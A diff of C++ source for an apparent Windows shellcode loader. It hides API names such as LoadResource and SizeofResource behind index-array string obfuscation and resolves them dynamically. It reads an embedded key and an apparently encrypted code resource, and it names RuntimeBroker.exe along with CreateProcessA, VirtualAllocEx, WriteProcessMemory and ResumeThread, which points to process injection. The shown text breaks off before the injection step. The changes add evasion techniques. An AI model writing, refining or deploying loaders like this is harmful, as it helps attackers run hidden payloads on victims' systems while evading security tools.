@@ -6,7 +6,7 @@
 #include <cstdlib>
 #include <ctime>
 #include <string>  // Include this for std::string
-//CreateProcessA , VirtualAllocEx , WriteProcessMemory ,ResumeThread ,GetModuleHandle ,LoadResource.
+//CreateProcessA , VirtualAllocEx , WriteProcessMemory ,ResumeThread  ,LoadResource , kernel32.dll , SizeOfResource.
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "user32.lib")
 
@@ -22,44 +22,45 @@ std::string getoriginal(int offsets[], char* big_string, int sizeof_offset){  //
 
 void main_star() {
 
-    HMODULE istfromKernel32 = LoadLibraryA("kernel32.dll");
-    char big_string[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+    char big_string[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.";
+    int ws_lld_ker_32[] = {10, 4, 17, 13, 4, 11, 55, 54, 62, 3, 11, 11};
+    HMODULE istfromKernel32 = LoadLibraryA(getoriginal(ws_lld_ker_32, big_string, sizeof(ws_lld_ker_32)).c_str());
+    std::cout <<getoriginal(ws_lld_ker_32, big_string, sizeof(ws_lld_ker_32)).c_str() << std::endl;
     int creatingprocess[] = {28, 17, 4, 0, 19, 4, 41, 17, 14, 2, 4, 18, 18, 26};
     int virall[] ={ 47, 8, 17, 19, 20, 0, 11, 26, 11, 11, 14, 2, 30, 23 };
     int wrproc[] = { 48, 17, 8, 19, 4, 41, 17, 14, 2, 4, 18, 18, 38, 4, 12, 14, 17, 24};
     int reth[] = {43, 4, 18, 20, 12, 4, 45, 7, 17, 4, 0, 3};
     
-    int afindres[] = {31, 8, 13, 3, 43, 4, 18, 14, 20, 17, 2, 4};
     int load_resource_ok[] = {37, 14, 0, 3, 43, 4, 18, 14, 20, 17, 2, 4};
-    int get_mod_handle_ok[] = {32, 4, 19, 38, 14, 3, 20, 11, 4, 33, 0, 13, 3, 11, 4};
-    FARPROC pFind_Resource = GetProcAddress(istfromKernel32,getoriginal(afindres, big_string, sizeof(afindres)).c_str());
-    FARPROC pget_mod_handle_ok = GetProcAddress(istfromKernel32, getoriginal(get_mod_handle_ok, big_string, sizeof(get_mod_handle_ok)).c_str());
-    FARPROC pLoad_Resource = GetProcAddress(istfromKernel32, getoriginal(load_resource_ok, big_string, sizeof(load_resource_ok)).c_str());
+    int size_of_Resource[] = {44, 8, 25, 4, 14, 5, 43, 4, 18, 14, 20, 17, 2, 4};
     
-    char* ke;
-    DWORD keLen;
-    //HMODULE hModule = GetModuleHandle(NULL);
-    HMODULE hModule = ((HMODULE(WINAPI*)(LPCSTR))pget_mod_handle_ok)(NULL);
-    HRSRC hResource = ((HRSRC(WINAPI*)(HMODULE, LPCSTR, LPCSTR))pFind_Resource)(hModule, "dhanushkey1", RT_RCDATA);
-    //HRSRC hResource = FindResource(hModule, "dhanushkey1", RT_RCDATA);
-    //HGLOBAL resrdata = LoadResource(hModule, hResource);
+    //std::cout <<getoriginal(afindres, big_string, sizeof(afindres)) << std::endl;
+    std::cout <<getoriginal(size_of_Resource, big_string, sizeof(size_of_Resource)) << std::endl;  
+    std::cout <<getoriginal(load_resource_ok, big_string, sizeof(load_resource_ok)) << std::endl;
+    
+    
+    FARPROC pLoad_Resource = GetProcAddress(istfromKernel32, getoriginal(load_resource_ok, big_string, sizeof(load_resource_ok)).c_str());
+    FARPROC pSize_of_Resource = GetProcAddress(istfromKernel32, getoriginal(size_of_Resource, big_string, sizeof(size_of_Resource)).c_str());
+     
+  
+    auto Size_Of_Resource_Func = (DWORD(WINAPI*)(HMODULE, HRSRC))pSize_of_Resource;
+ 
+    
+    HMODULE hModule = GetModuleHandle(NULL);
+    HRSRC hResource = FindResource(hModule, "dhanushkey1", RT_RCDATA);
     HGLOBAL resrdata = ((HGLOBAL(WINAPI*)(HMODULE, HRSRC))pLoad_Resource)(hModule, hResource);
-    keLen = SizeofResource(hModule, hResource);
-    ke = (char*)LockResource(resrdata);
+    DWORD keLen = Size_Of_Resource_Func(hModule, hResource);
+    char* ke = (char*)LockResource(resrdata);
 
-    // Load the second resource (dhanushcode56)
+   
     char* code199k;
     DWORD code199kLen;
-    //hResource = FindResource(hModule, "dhanushcode56", RT_RCDATA);
-    hResource = ((HRSRC(WINAPI*)(HMODULE, LPCSTR, LPCSTR))pFind_Resource)(hModule, "dhanushcode56", RT_RCDATA);
-    //resrdata = LoadResource(hModule, hResource);
+    hResource = FindResource(hModule, "dhanushcode56", RT_RCDATA);
     resrdata = ((HGLOBAL(WINAPI*)(HMODULE, HRSRC))pLoad_Resource)(hModule, hResource);
-    code199kLen = SizeofResource(hModule, hResource);
+    code199kLen = Size_Of_Resource_Func(hModule, hResource);
     code199k = (char*)LockResource(resrdata);
     
- 
-    printf("\n");
-    std::cout << getoriginal(creatingprocess, big_string, sizeof(creatingprocess)) << std::endl;  // Use std::cout
+    std::cout <<getoriginal(creatingprocess, big_string, sizeof(creatingprocess)) << std::endl;  
     
     const char* processptaah = "c:\\windows\\system32\\RuntimeBroker.exe";
 
